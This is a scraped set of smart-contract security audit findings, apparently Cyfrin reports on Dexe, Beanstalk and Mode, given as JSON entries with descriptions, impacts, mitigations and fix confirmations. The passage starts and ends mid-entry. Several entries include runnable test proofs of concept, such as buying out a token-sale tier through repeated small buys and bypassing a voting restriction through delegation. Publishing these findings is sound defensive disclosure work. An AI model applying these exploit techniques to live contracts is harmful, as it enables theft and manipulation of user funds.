tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n\n            // end: user has bought wei(1000) tokens - the entire tier!\n            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, wei(1000));\n\n            // attempting to buy more fails as the entire tier\n            // has been bought by the single user\n            await truffleAssert.reverts(\n              tsp.buy(TIER8, purchaseToken1.address, wei(25)),\n              \"TSP: insufficient sale token amount\"\n            );\n          });\n"
    ],
    "Description": [
        " An attacker can bypass the token sale maxAllocationPerUser restriction to buy out the entire tier by doing multiple small buys under this limit."
    ],
    "Impact": [
        " Permanent grief for other users who are unable to buy any of the exploited tier's tokens. Depending on the total supply a buyer could take control of the majority of the tokens by scooping them all up in a token sale, preventing them being distributed as intended and having monopoly control of the market. The maxAllocationPerUser restriction is not working as intended and can easily be bypassed by anyone."
    ],
    "Proof of Concept": [
        " First add Tier 8 to test/gov/proposals/TokenSaleProposal.test.js L718:",
        "Then add the PoC to the same file under the section describe(\"if added to whitelist\", () => { around L1995:",
        "To run the PoC: npx hardhat test --grep \"bypass token sale maxAllocationPerUser\""
    ],
    "Recommended Mitigation": [
        " libs/gov/token-sale-proposal/TokenSaleProposalBuy.sol L115-120 should add the total amount already purchased by the user in the current tier to the current amount being purchased in the same tier, and ensure this total is <= maxAllocationPerUser."
    ],
    "Dexe": [
        "\nFixed in PR164.  We also changed how exchageRate works. So it was \"how many sale tokens per purchase token\", now it is \"how many purchase tokens per sale token\"."
    ],
    "Cyfrin": [
        " Verified; changed our PoC exchange rate to 1:1."
    ]
}
----End JSON----

https://solodit.xyz/issues/a-malicious-dao-pool-can-create-a-token-sale-tier-without-actually-transferring-any-dao-tokens-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function createTier(\n        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,\n        uint256 newTierId,\n        ITokenSaleProposal.TierInitParams memory _tierInitParams\n    ) external {\n\n       ....\n         /// @dev return value is not checked intentionally\n  >      tierInitParams.saleTokenAddress.call(\n            abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                msg.sender,\n                address(this),\n                totalTokenProvided\n            )\n        );  //@audit -> no check if the contract balance has increased proportional to the totalTokenProvided\n   }\n"
    ],
    "Description": [
        " TokenSaleProposalCreate::createTier is called by a DAO Pool owner to create a new token sale tier. A fundamental prerequisite for creating a tier is that the DAO Pool owner must transfer the totalTokenProvided amount of DAO tokens to the TokenSaleProposal.",
        "Current implementation implements a low-level call to transfer tokens from msg.sender(GovPool) to TokenSaleProposal contract. However, the implementation fails to validate the token balances after the transfer is successful. We notice a dev comment stating \"return value is not checked intentionally\" - even so, this vulnerability is not related to checking return status but to verifying the contract balances before & after the call.",
        "Since a DAO Pool owner can use any ERC20 as a DAO token, it is possible for a malicious Gov Pool owner to implement a custom ERC20 implementation of a token that overrides the transferFrom function. This function can override the standard ERC20 transferFrom logic that fakes a successful transfer without actually transferring underlying tokens."
    ],
    "Impact": [
        " A fake tier can be created without the proportionate amount of DAO Pool token balance in the TokenSaleProposal contract. Naive users can participate in such a token sale assuming their DAO token claims will be honoured at a future date. Since the pool has insufficient token balance, any attempts to claim the DAO pool tokens can lead to a permanent DOS."
    ],
    "Recommended Mitigation": [
        " Calculate the contract balance before and after the low-level call and verify if the account balance increases by totalTokenProvided. Please be mindful that this check is only valid for non-fee-on-transfer tokens. For fee-on-transfer tokens, the balance increase needs to be further adjusted for the transfer fees. Example code for non-free-on-transfer-tokens:"
    ],
    "Dexe": [
        "\nFixed in PR177."
    ],
    "Cyfrin": [
        " The fix changed from using transferFrom to safeTransferFrom however the recommendation requires that the actual balance be checked before and after the transfer to verify the correct amount of tokens have actually been transferred."
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-use-delegation-to-bypass-voting-restriction-to-vote-on-proposals-they-are-restricted-from-voting-on-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "      it(\"audit bypass user restriction on voting via delegation\", async () => {\n        let votingPower = wei(\"100000000000000000000\");\n        let proposalId  = 1;\n\n        // create a proposal where SECOND is restricted from voting\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesUndelegateTreasury(SECOND, 1, [])]],\n          []\n        );\n\n        // if SECOND tries to vote directly this fails\n        await truffleAssert.reverts(\n          govPool.vote(proposalId, true, votingPower, [], { from: SECOND }),\n          \"Gov: user restricted from voting in this proposal\"\n        );\n\n        // SECOND has another address SLAVE which they control\n        let SLAVE = await accounts(10);\n\n        // SECOND delegates their voting power to SLAVE\n        await govPool.delegate(SLAVE, votingPower, [], { from: SECOND });\n\n        // SLAVE votes on the proposal; votes \"0\" as SLAVE has no\n        // personal voting power, only the delegated power from SECOND\n        await govPool.vote(proposalId, true, \"0\", [], { from: SLAVE });\n\n        // verify SLAVE's voting\n        assert.equal(\n          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.PersonalVote)).totalRawVoted,\n          \"0\" // personal votes remain the same\n        );\n        assert.equal(\n          (await govPool.getUserVotes(proposalId, SLAVE, VoteType.MicropoolVote)).totalRawVoted,\n          votingPower // delegated votes from SECOND now included\n        );\n        assert.equal(\n          (await govPool.getTotalVotes(proposalId, SLAVE, VoteType.PersonalVote))[0].toFixed(),\n          votingPower // delegated votes from SECOND now included\n        );\n\n        // SECOND was able to abuse delegation to vote on a proposal they were\n        // restricted from voting on.\n      });\n"
    ],
    "Description": [
        " Attacker can use delegation to bypass voting restriction to vote on proposals they are restricted from voting on."
    ],
    "Impact": [
        " Attacker can vote on proposals they are restricted from voting on."
    ],
    "Proof of Concept": [
        " Add PoC to GovPool.test.js under section describe(\"vote()\", () => {:",
        "Run with: npx hardhat test --grep \"audit bypass user restriction on voting via delegation\""
    ],
    "Recommended Mitigation": [
        " Rework the voting restriction mechanism such that attackers can't abuse the delegation system to vote on proposals they are prohibited from voting on."
    ],
    "Dexe": [
        "\nFixed in PR168."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/delegators-incorrectly-receive-less-rewards-for-longer-proposals-with-multiple-delegations-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "    async function changeInternalSettings2(validatorsVote, duration) {\n      let GOV_POOL_SETTINGS = JSON.parse(JSON.stringify(POOL_PARAMETERS.settingsParams.proposalSettings[1]));\n      GOV_POOL_SETTINGS.validatorsVote = validatorsVote;\n      GOV_POOL_SETTINGS.duration = duration;\n\n      await executeValidatorProposal(\n        [\n          [settings.address, 0, getBytesAddSettings([GOV_POOL_SETTINGS])],\n          [settings.address, 0, getBytesChangeExecutors([govPool.address, settings.address], [4, 4])],\n        ],\n        []\n      );\n    }\n",
        "      it(\"audit micropool rewards short-change delegator for long proposals with multiple delegations\", async () => {\n        // so proposals will be active in voting state for longer\n        const WEEK = (30 * 24 * 60 * 60) / 4;\n        const TWO_WEEKS = WEEK * 2;\n        const MONTH = TWO_WEEKS * 2;\n        const TWO_MONTHS = MONTH * 2;\n\n        // so proposal doesn't need to go to validators\n        await changeInternalSettings2(false, TWO_MONTHS);\n\n        // required for executing the first 2 proposals\n        await govPool.deposit(govPool.address, wei(\"200\"), []);\n\n        // create 4 proposals; only the first 2 will be executed\n        // create proposal 1\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(4, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(4, wei(\"100\"), [], false)]]\n        );\n        // create proposal 2\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n        // create proposal 3\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n        // create proposal 4\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(5, wei(\"100\"), [], false)]]\n        );\n\n        let proposal1Id = 2;\n        let proposal2Id = 3;\n        let DELEGATEE = await accounts(10);\n        let DELEGATOR1 = await accounts(9);\n\n        let delegator1Tokens = wei(\"200000000000000000000\");\n        let delegator1Half = wei(\"100000000000000000000\");\n\n        let delegateeReward = wei(\"40000000000000000000\");\n        let delegator1Reward = wei(\"160000000000000000000\");\n\n        // mint tokens & deposit them to have voting power\n        await token.mint(DELEGATOR1, delegator1Tokens);\n        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });\n        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });\n\n        // delegator1 delegates its total voting power to AUDITOR\n        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });\n\n        // DELEGATEE votes on the first proposal\n        await govPool.vote(proposal1Id, true, \"0\", [], { from: DELEGATEE });\n\n        // advance time\n        await setTime((await getCurrentBlockTime()) + 1);\n\n        // proposal now in SucceededFor state\n        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);\n\n        // execute proposal 1\n        await govPool.execute(proposal1Id);\n\n        // verify pending rewards via GovPool::getPendingRewards()\n        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        // verify pending delegator rewards via GovPool::getDelegatorRewards()\n        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n        // delegator1 receives full reward for all tokens they delegated\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);\n\n        // reward balances 0 before claiming rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), \"0\");\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), \"0\");\n\n        // claim rewards\n        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });\n        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });\n\n        // verify reward balances after claiming rewards\n        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);\n        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);\n\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.Voting);\n\n        // delegator1 undelegates half of its total voting power from DELEGATEE,\n        // such that DELEGATEE only has half the voting power for second proposal\n        await govPool.undelegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });\n\n        // DELEGATEE votes on the second proposal for the first time using the first\n        // half of DELEGATOR1's voting power. This isn't enough to decide the proposal\n        await govPool.vote(proposal2Id, true, \"0\", [], { from: DELEGATEE });\n\n        // time advances 1 month, proposal is a longer proposal so still in voting state\n        await setTime((await getCurrentBlockTime()) + MONTH);\n\n        // delegator1 delegates remaining half of its voting power to DELEGATEE\n        // this cancels the previous vote and re-votes with the full voting power\n        // which will be enough to decide the proposal\n        await govPool.delegate(DELEGATEE, delegator1Half, [], { from: DELEGATOR1 });\n\n        // advance time\n        await setTime((await getCurrentBlockTime()) + 1);\n\n        // proposal now in SucceededFor state\n        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);\n\n        // execute proposal 2\n        await govPool.execute(proposal2Id);\n\n        // verify pending rewards via GovPool::getPendingRewards()\n        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        // delegatee getting paid the full rewards for the total voting power\n        // delegator1 delegated\n        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);\n\n        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);\n        assert.equal(pendingRewards.votingRewards[0].personal, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].micropool, \"0\");\n        assert.equal(pendingRewards.votingRewards[0].treasury, \"0\");\n\n        // verify pending delegator rewards via GovPool::getDelegatorRewards()\n        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);\n        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);\n        assert.deepEqual(pendingRewards.isVoteFor, [true]);\n        assert.deepEqual(pendingRewards.isClaimed, [false]);\n\n        // fails as delegator1 only paid half the rewards - not being paid for the\n        // full amount it delegated!\n        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);\n      });\n"
    ],
    "Description": [
        " Delegators incorrectly receive less rewards for longer proposals with multiple delegations as retrieving the expected rewards from the list of delegations will fail to retrieve the entire delegated amount when multiple delegations occur from the same delegator to the same delegatee over separate blocks."
    ],
    "Impact": [
        " Delegators will receive less rewards than they should."
    ],
    "Proof of Concept": [
        " Consider this scenario:",
        "2 Proposals that have a longer active timeframe with an endDate 2 months from now.",
        "Proposal 1, Delegator delegates full voting power to Delegatee who votes, deciding proposal 1. Proposal 1 gets executed, both delegatee & delegator get paid their correct rewards.",
        "Proposal 2, Delegator delegates half their voting power to Delegatee who votes but these votes aren't enough to decide the proposal. One month passes & the proposal is still active as it goes for 2 months.",
        "Delegator delegates the second half of their voting power to Delegatee. This triggers the automatic revoteDelegated such that Delegatee votes with the full voting power of Delegator which is enough to decide proposal 2.",
        "Proposal 2 is then executed. Delegatee gets paid the full rewards for using Delegator's full voting power, but Delegator only receives HALF of the rewards they should get, even though they delegated their full voting power which was used to decide the proposal.",
        "Here is where it gets even more interesting; if instead of doing the second half-power delegation, Delegator undelegates the remaining amount then delegates the full amount and then Delegatee votes, Delegator gets paid the full rewards. But if delegator delegates in multiple (2 txns) with a month of time elapsing between them, they only get paid half the rewards.",
        "First add this helper function in GovPool.test.js under section describe(\"Fullfat GovPool\", () => {:",
        "Then put PoC in GovPool.test.js under section describe(\"getProposalState()\", () => {:",
        "Run with: npx hardhat test --grep \"rewards short-change delegator for long proposals\""
    ],
    "Recommended Mitigation": [
        " Change how GovMicroPool retrieves the expected rewards from the list of delegated amounts such that the entire delegated amount will be retrieved when the same delegator delegates to the same delegatee multiple times over separate blocks."
    ],
    "Dexe": [
        "\nFixed in PR170."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/the-previous-milestone-stem-should-be-scaled-for-use-with-the-new-gauge-point-system-which-uses-untruncated-values-moving-forward-cyfrin-none-cyfrin-beanstalk-bip-39-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "_stemTipForToken = s.ss[token].milestoneStem +\n    int96(s.ss[token].stalkEarnedPerSeason).mul(\n        int96(s.season.current).sub(int96(s.ss[token].milestoneSeason))\n    );\n",
        "    function stemTipForToken(address token)\n        internal\n        view\n        returns (int96 _stemTipForToken)\n    {\n        AppStorage storage s = LibAppStorage.diamondStorage();\n\n        // SafeCast unnecessary because all casted variables are types smaller that int96.\n        _stemTipForToken = s.ss[token].milestoneStem +\n        int96(s.ss[token].stalkEarnedPerSeason).mul(\n            int96(s.season.current).sub(int96(s.ss[token].milestoneSeason))\n        ).div(1e6); //round here\n    }\n"
    ],
    "Description": [
        " Within the Beanstalk Silo, the milestone stem for a given token is the cumulative amount of grown stalk per BDV for this token at the last stalkEarnedPerSeason update. Previously, the milestone stem was stored in its truncated representation; however, the seed gauge system now stores the value in its untruncated form due to the new granularity of grown stalk and the frequency with which these values are updated.",
        "At the time of upgrade, the previous (truncated) milestone stem for each token should be scaled for use with the gauge point system by multiplying up by a factor of 1e6. Otherwise, there will be a mismatch in decimals when calculating the stem tip."
    ],
    "Impact": [
        " The mixing of decimals between the old milestone stem (truncated) and the new milestone stem (untruncated, after the first gm call following the BIP-39 upgrade) breaks the existing grown stalk accounting, resulting in a loss of grown stalk for depositors."
    ],
    "Proof of Concept": [
        " The previous implementation returns the cumulative stalk per BDV with 4 decimals:",
        "Which can be mathematically abstracted to:\n$$StemTip(token) = getMilestonStem(token) + (current \\ season - getMilestonStemSeason(token)) \\times \\frac{stalkEarnedPerSeason(token)}{10^{6}}$$",
        "This division by $10^{6}$ happens because the stem tip previously had just 4 decimals. This division allows backward compatibility by not considering the final 6 decimals. Therefore, the stem tip MUST ALWAYS have 4 decimals.",
        "The milestone stem is now updated in each gm call so long as all LP price oracles pass their respective checks. Notably, the milestone stem is now stored with 10 decimals (untruncated), hence why the second term of the abstraction has omited the 10^{6} division in LibTokenSilo::stemTipForTokenUntruncated.",
        "However, if the existing milestone stem is not escalated by $10^{6}$ then the addition performed during the upgrade and in subsequent gm calls makes no sense. This is mandatory to be handled within the upgrade otherwise every part of the protocol which calls LibTokenSilo.stemTipForToken will receive an incorrect value, except for BEAN:ETH Well LP (given it was created after the Silo v3 upgrade).",
        "Some instances where this function is used include:",
        "As can be observed, critical parts of the protocol are compromised, leading to further cascading issues."
    ],
    "Recommended Mitigation": [
        " Scale up the existing milestone stem for each token:",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/incorrect-handling-of-decimals-in-liblockedunderlyinggetpercentlockedunderlying-results-in-an-incorrect-value-being-returned-affecting-the-temperature-and-bean-to-maxlp-gaugepoint-per-bdv-ratio-updates-in-each-subsequent-call-to-seasonfacetgm-when-unripe-asset-supply-10m-cyfrin-none-cyfrin-beanstalk-bip-39-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " Due to the Barn Raise and the associated Beans underlying Unripe assets, the number of tradable Beans does not equal the total Bean supply. Within the calculation of L2SR, the term \"locked liquidity\" refers to the portion of liquidity in the BEAN:ETH WELL that cannot be retrieved through chopping until the corresponding Fertilizer is paid.",
        "The exchange ratio for the corresponding underlying asset can be summarized in the following formula:",
        "$$\\frac{Paid Fertilizer}{Minted Fertilizer} \\times \\frac{totalUnderlying(urAsset)}{supply(urAsset)}$$",
        "The second factor indicates the amount of the underlying asset backing each unripe asset, while the first indicates the distribution of the underlying asset based on the ratio of Fertilizer that is already paid.",
        "When a user chops an unripe asset, it is burned in exchange for a penalized amount of the underlying asset. The remaining underlying asset is now shared among the remaining unripe asset holders, meaning that if another user tries to chop the same amount of unripe asset at a given recapitalization rate, they will receive a greater amount of underlying asset.",
        "For instance, assume that:",
        "If Alice chops 1M unripe tokens:\n$$1,000,000 \\times 0.50 \\times \\frac{22,000,000}{70,000,000} =$$\n$$1,000,000 \\times 0.50 \\times 0.31428 =$$\n$$1,000,000 \\times 0.50 \\times 0.31428 =$$\n$$1,000,000 \\times 0.15714285 = $$\n$$157,142.85$$",
        "If Bob then chops the same amount of tokens:\n$$1,000,000 \\times 0.50 \\times \\frac{22,000,000-157,142.85}{70,000,000 - 1,000,000} =$$\n$$1,000,000 \\times 0.50 \\times \\frac{21,842,857.15}{69,000,000} =$$\n$$1,000,000 \\times 0.50 \\times \\frac{21,842,857.15}{69,000,000} =$$\n$$1,000,000 \\times 0.50 \\times 0.3165 =$$\n$$158,281.57$$",
        "Given that the assumption of chopping the total unripe asset supply in one step is highly unlikely, the Beanstalk Farms team decided to perform an off-chain regression based on the average unripe asset per unripe asset holder. This yields an approximation for the percentage locked underlying token per asset based on the current unripe asset supply. An on-chain look-up table is used to retrieve the values of this regression; however, the issue with its implementation lies in its failure to account for unripe token decimals when compared with the inline conditional supply constants 1_000_000, 5_000_000, and 10_000_000 as the intervals on which the iterative simulation was performed. Given these constants are not a fixed-point representation of the numbers they are intended to represent, comparison with the 6-decimal supply will be incorrect."
    ],
    "Impact": [
        " Given that unripe assets have 6 decimals, LibLockedUnderlying::getPercentLockedUnderlying will tend to execute this conditional branch, producing an incorrect calculation of locked underlying whenever the supply of the unripe asset is below 10M.",
        "In the given scenario, this error would cascade into an incorrect calculation of L2SR, affecting how the temperature and Bean to maxLP gaugePoint per BDV ratio should be updated in the call to Weather::calcCaseIdandUpdate within SeasonFacet::gm."
    ],
    "Proof of Concept": [
        " A differential test (see Appendix A) was written to demonstrate this issue based on CSV provided by the Beanstalk Farms team. Modifications to the CSV include:"
    ],
    "Recommended Mitigation": [
        " Scale each inline constant that is compared against the unripe supply by 6 decimals.",
        "For similar cases in the future, differential testing between the expected and actual outputs is effective in catching bugs of this type which rely on pre-computed off-chain values."
    ]
}
----End JSON----

https://solodit.xyz/issues/gauge-point-updates-should-be-made-considering-the-time-weighted-average-deposited-lp-bdv-rather-than-instantaneous-at-the-time-of-sunrise-cyfrin-none-cyfrin-beanstalk-bip-39-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " Prior to the introduction of the Seed Gauge System, the Grown Stalk per BDV for whitelisted assets was static and could only be changed via governance. The Seed Gauge System now allows Beanstalk to target an amount of Grown Stalk per BDV that should be issued per Season, with Gauge Points being introduced to determine how the Grown Stalk issued that Season should be distributed between whitelisted LP tokens.",
        "Gauge Points are updated every Season, when LibGauge::stepGauge is called within SeasonFacet::gm. This Gauge Point update is currently performed by considering the instantaneous total deposited LP BDV at the time of the gm call. However, this value can be subject to manipulation so the Seed Gauge System should instead use a time-weighted average deposited LP BDV over the previous Season duration."
    ],
    "Impact": [
        " Given the Gauge Points for a given whitelisted LP can only increase/decrease by one point per Season, and the Bean to max LP GP per BDV ratio is capped at 100%, the incentive to perform this attack is relatively low. However, a large deposit immediately before the Sunrise call, and withdrawal immediately after, could nonetheless result in manipulation meaning the Seed Gauge system does not work as intended."
    ],
    "Recommended Mitigation": [
        " Consider calculating time-weighted average deposited LP BDVs over the previous Season duration rather than using an instantaneous value. The BDV to include in the calculation at each block should be the one at the end of the previous block to avoid in-block manipulation. These values should be stored and the update should be triggered whenever a function is called which modifies the total deposited BDV in any way."
    ]
}
----End JSON----

https://solodit.xyz/issues/gauge-point-constants-in-initbipseedgauge-should-be-scaled-by-the-ratio-of-deposited-bdv-cyfrin-none-cyfrin-beanstalk-bip-39-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// InitBipSeedGauge.sol\nuint128 beanEthGp = uint128(s.ss[C.BEAN_ETH_WELL].stalkEarnedPerSeason) * 500 * 1e12;\nuint128 bean3crvGp = uint128(s.ss[C.CURVE_BEAN_METAPOOL].stalkEarnedPerSeason) * 500 * 1e12\n"
    ],
    "Description": [
        " The current initial Gauge Point (GP) distribution is based solely on the grown stalk per season per BDV for each LP, whereas it should be determined by considering the deposited BDV per LP.",
        "Considering the following math which underlies the behavior of the gauge system:\n$$depositedBDVRatio(LP) = \\frac{silo.totalDepositedBDV(LP)}{\\sum_{wlpt}^{wlpt \\in Whitelisted \\ LP \\ Tokens} silo.totalDepositedBDV} $$\n$GP_{s}(LP) =$",
        "It can be seen that the formula relies on the previous $GP_{s-1}(LP)$, where $s$ indicates the current season number and deposited BDV ratio. Moreover, it is evident that the intention of this mechanism is to incentivize the Beanstalk protocol to have a pre-defined optimal deposited BDV ratio for each LP. Consequently, the initial assignment of GP should consider this intention."
    ],
    "Impact": [
        " An incorrect initial GP distribution can result in unintended initial behavior, which can take a significant amount of time to rectify given that gauge points can only increase/decrease by one point per season as defined in GaugePointFacet::defaultGaugePointFunction."
    ],
    "Proof of Concept": [
        "",
        "As observed, the initial GP assignment is determined by the stalk earned per season before BIP-39, with the following values:",
        "These values are not correlated with the total BDV deposited per LP. Consequently, the initial assignment of GP is made with incorrect values."
    ],
    "Recommended Mitigation": [
        " Considering that one gauge point is equal to 1e18, the following modification should be made:"
    ]
}
----End JSON----

https://solodit.xyz/issues/incorrect-calculation-of-unmigrated-bdvs-for-use-in-initbipseedgaugeinit-cyfrin-none-cyfrin-beanstalk-bip-39-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "unmigrated:  {\n  '0x1BEA0050E63e05FBb5D8BA2f10cf5800B6224449': BigNumber { value: \"3209210313166\" },\n  '0x1BEA3CcD22F4EBd3d37d731BA31Eeca95713716D': BigNumber { value: \"6680992571569\" },\n  '0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab': BigNumber { value: \"304630107407\" },\n  '0xc9C32cd16Bf7eFB85Ff14e0c8603cc90F6F2eE49': BigNumber { value: \"26212521946\" }\n}\n",
        "unmigrated:  {\n  '0x1BEA0050E63e05FBb5D8BA2f10cf5800B6224449': BigNumber { value: \"3736196158417\" },\n  '0x1BEA3CcD22F4EBd3d37d731BA31Eeca95713716D': BigNumber { value: \"7119564766493\" },\n  '0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab': BigNumber { value: \"689428296238\" },\n  '0xc9C32cd16Bf7eFB85Ff14e0c8603cc90F6F2eE49': BigNumber { value: \"26512602424\" }\n}\n"
    ],
    "Description": [
        " The current values for the constants in InitBipSeedGauge::init are an estimation and not finalized. To correctly calculate the BDV, the Beanstalk Farms team simulates migrating all the remaining unmigrated deposits at the block in which BIP-38 was executed such that the change of BDV corresponding to the underlying asset in BDVFacet::unripeLPToBDV is considered and subject to the slippage incurred at the time of liquidity migration. The deposits.json file contains a list of outstanding deposits at the Silo V3 deployment block 17671557, so the script considers all removeDeposit events after this point as deposits to be removed from the unmigrated BDV. By filtering from the Enroot fix deployment block 17251905, if an account has removed its deposit after the Enroot fix but before Silo V3 was deployed, this would improperly assume the deposits have been migrated when they haven't. Additionally, given the script is forking mainnet at the BIP-38 execution block 18392690, it is not correct to use 18480579 as the end block for event filtering.",
        "The case has also been considered that, given the state changes will already have been applied, and assuming the migration transaction isn't top/bottom of block, it might be desirable to fork/filter up to the block before BIP-38 execution and check whether any migrations occurred before/after the migration transaction that need to be considered manually. After further inspection of the block in which the BIP-38 upgrade took place, it appears this is not necessary as no events were emitted.",
        "An additional discrepancy in the unmigrated Bean BDV value was identified by the Beanstalk Farms team. After Silo V3, the implementation of Sun::rewardToSilo increments the BDV by the amount of Bean issued to the Silo, but all previously earned Beans are not considered. Therefore, the value returned by SiloExit::totalEarnedBeans at the time of Silo V3 deployment should be added to the total."
    ],
    "Impact": [
        " The calculated unmigrated BDVs are incorrect, as shown below. The current implementation returns values that are smaller than they should be, meaning the total deposited BDV will fail to consider some deposits and be lower than intended.",
        "Output of the current implementation:",
        "Corrected output:"
    ],
    "Recommended Mitigation": [
        " Apply the following diff:",
        "Retrieve the amount of Beans previously issued to the Silo:",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/polygon-chain-reorgs-will-change-mystery-box-tiers-which-can-be-gamed-by-validators-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " REQUEST_CONFIRMATIONS = 3 is too small for polygon, as chain re-orgs frequently have block-depth greater than 3."
    ],
    "Impact": [
        " Chain re-orgs re-order blocks and transactions changing randomness results. Someone who originally won a rare box could have that result changed into a common box and vice versa due to changing randomness result during the re-org.",
        "This can also be exploited by validators who can intentionally rewrite the chain's history to force a randomness request into a different block, changing the randomness result. This allows validators to get a fresh random value which may be to their advantage if they are minting mystery boxes by moving the txn around to get a better randomness result to mint a rarer box."
    ],
    "Recommended Mitigation": [
        " REQUEST_CONFIRMATIONS = 30 appears very safe for polygon as it is very rare for chain re-orgs to have block-depth greater than this. If this happens occasionally it isn't a big deal, but if it happens all the time (\"3\" ensures this) that is not good and potentially exploitable by validators."
    ],
    "Mode": [
        "\nFixed in commit 85b2012."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/transferring-mystery-boxes-bricks-token-redemption-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " MysteryBox is an ERC1155 contract which users expect to be able to transfer to other addresses via the in-built transfer functions. But MysteryBox::claimMysteryBoxes() reverts unless the caller is the same address who minted the box since the internal mappings that track mystery box ownership are never updated when transfers occur."
    ],
    "Impact": [
        " Token redemption is bricked if users transfer their mystery box. Users reasonably expect to be able to transfer their mystery box from one address they control to another address (if for example their first address is compromised), or they may wish to sell their mystery box on platforms like OpenSea which support ERC1155 sales."
    ],
    "Recommended Mitigation": [
        " Override ERC1155 transfer hooks to either prevent transferring of mystery boxes, or to update the internal mappings such that when mystery boxes are transferred the new owner address can redeem their tokens. The second option may be more attractive for the protocol as it allows mystery box holders to access liquidity without putting sell pressure on the token, creating a \"secondary market\" for mystery boxes."
    ],
    "Mode": [
        "\nFixed in commit a65a50c by overriding ERC1155::_beforeTokenTransfer() to prevent mystery boxes from being transferred."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/distribution-proposals-simultaneously-funded-by-both-eth-and-erc20-tokens-results-in-stuck-eth-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
